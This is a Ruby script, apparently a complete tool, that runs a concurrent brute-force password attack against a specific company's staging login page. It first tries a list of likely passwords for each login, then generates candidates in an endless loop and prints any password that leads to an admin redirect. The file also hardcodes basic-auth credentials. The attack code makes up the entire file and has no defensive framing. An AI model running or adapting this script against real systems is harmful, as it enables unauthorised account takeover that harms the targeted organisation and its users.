require 'typhoeus'
require 'gentle_brute'

class BatteringRam
	attr_accessor :brute, :hydra, :min_password_length, :potential_logins, :likely_passwords

	def initialize(potential_logins, likely_passwords=[], min_password_length=6)
		@potential_logins = potential_logins
		@likely_passwords = likely_passwords
		@min_password_length = min_password_length
		@brute = GentleBrute::BruteForcer.new(@min_password_length)
		@hydra = Typhoeus::Hydra.new
	end

	def new_login_request(login, password)
		options = {
			method: :post,
		  userpwd: "admin:test",
		  followlocation: true,
		  body: { user: {login: login, password: password} },
		  headers: { "Cache-Control" => "max-age=0" }
		}
		request = Typhoeus::Request.new("http://staging.gopro.com/users/sign_in", options)
		request.on_complete do |response|
			if response.redirections.any? {|r| r.options[:response_headers].match(/admin/) }
				puts("\nThe password for #{login} is [#{password}]!")
			else
				print(".")
			end
		end
		return request
	end

	def try_likely_passwords
		@potential_logins.each do |login|
			@likely_passwords.each do |password|
				@hydra.queue new_login_request(login, password)
			end
		end
		puts("Starting Brute Force password attack on GoPro using #{potential_logins.count} potential logins.")
		@hydra.run
	end

	def run
		try_likely_passwords

		while true
		  password = @brute.next_valid_phrase
			@potential_logins.each do |login|
				@hydra.queue new_login_request(login, password)
			end
			@hydra.run
		end
	end
end